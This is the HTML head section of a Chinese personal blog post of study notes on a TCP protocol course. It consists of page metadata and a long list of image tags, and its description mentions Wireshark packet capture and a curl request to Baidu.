<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <meta name="renderer" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
  <link rel="dns-prefetch" href="http://caciacc.top">
  <title>计算机基础-深入理解TCP协议:从原理到实战-学习 | caciaCC的博客</title>
  <meta name="generator" content="hexo-theme-yilia-plus">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="description" content="学习资料深入理解 TCP 协议：从原理到实战 2 历史与分层模型TCP&#x2F;IP 网络分层用 wireshark 抓包的方式来开始看网络分层。 打开 wireshark，在弹出的选项中，选中 en0 网卡，在过滤器中输入host www.baidu.com，只抓取与百度服务器通信的数据包。 在命令行中用 curl 命令发起 http 请求：curl http:&#x2F;&#x2F;www.baidu.com，抓到的中间">
<meta property="og:type" content="article">
<meta property="og:title" content="计算机基础-深入理解TCP协议:从原理到实战-学习">
<meta property="og:url" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="caciaCC的博客">
<meta property="og:description" content="学习资料深入理解 TCP 协议：从原理到实战 2 历史与分层模型TCP&#x2F;IP 网络分层用 wireshark 抓包的方式来开始看网络分层。 打开 wireshark，在弹出的选项中，选中 en0 网卡，在过滤器中输入host www.baidu.com，只抓取与百度服务器通信的数据包。 在命令行中用 curl 命令发起 http 请求：curl http:&#x2F;&#x2F;www.baidu.com，抓到的中间">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/0.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/1.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/2.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/3.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/4.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/5.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/6.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/7.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/8.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/9.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/10.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/11.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/12.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/13.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/14.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/15.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/16.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/17.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/18.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/19.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/20.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/21.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/22.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/23.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/24.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/25.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/26.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/27.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/28.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/29.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/30.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/31.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/32.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/33.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/34.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/35.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/36.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/37.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/38.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/39.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/40.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/41.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/42.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/43.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/44.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/45.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/46.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/47.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/48.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/49.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/50.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/51.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/52.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/53.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/54.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/55.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/56.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/57.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/58.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/59.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/60.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/61.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/62.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/63.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/64.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/65.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/66.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/67.jpg">
<meta property="og:image" content="http://caciacc.top/2021/03/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0/68.jpg">
